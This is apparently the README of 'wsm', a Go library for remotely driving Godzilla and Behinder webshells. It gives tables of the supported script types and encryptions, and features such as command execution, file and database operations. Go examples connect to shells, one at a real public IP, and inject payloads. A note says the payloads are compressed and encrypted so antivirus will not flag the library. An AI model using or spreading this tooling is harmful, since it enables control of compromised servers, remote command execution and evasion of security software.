# wsm

通过 go 直接管理您的哥斯拉或冰蝎 webshell 的库

#### 哥斯拉

| 脚本类型  | 支持的加密类型    | 功能支持                                       |
| --------- | ----------------- | ---------------------------------------------- |
| asp       | XOR_BS6、XOR_RAW  | 存活验证、基本信息、命令执行、文件、数据库操作 |
| jsp、jspx | AES_BS64、AES_RAW | 存活验证、基本信息、命令执行、文件、数据库操作 |
| aspx      | AES_BS64、AES_RAW | 存活验证、基本信息、命令执行、文件、数据库操作 |
| php       | XOR_BS6、XOR_RAW  | 存活验证、基本信息、命令执行、文件、数据库操作 |

#### 冰蝎

| 脚本类型  | 支持的加密类型 | 功能支持                                       |
| --------- | -------------- | ---------------------------------------------- |
| asp       | XOR            | 存活验证、基本信息、命令执行、文件、数据库操作 |
| jsp、jspx | AES            | 存活验证、基本信息、命令执行、文件、数据库操作 |
| aspx      | AES            | 存活验证、基本信息、命令执行、文件、数据库操作 |
| php       | XOR、AES       | 存活验证、基本信息、命令执行、文件、数据库操作 |

#### 例子

冰蝎

```go
package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
	"log"
)

func main() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://127.0.0.1:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	// 验证存活
	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}
```

##### 哥斯拉

```go
package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/charset"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/godzilla"
	"log"
)

func main() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bs64.jsp",
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	// 注入全部的 payload
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}
```

更多例子可以看 [**examples**](https://github.com/Go0p/wsm/tree/main/examples)

#### 流量解密

支持流量解密

#### 说明

*payload 进行了 gzip 压缩后再 aes 加密，这样做是为了拉取该库时，不被杀软报毒*

#### 感谢

[Behinder](https://github.com/rebeyond/Behinder)

[Godzilla](https://github.com/BeichenDream/Godzilla)

[As-Exploits](https://github.com/yzddmr6/As-Exploits)

[每篇文章](https://yzddmr6.com/)
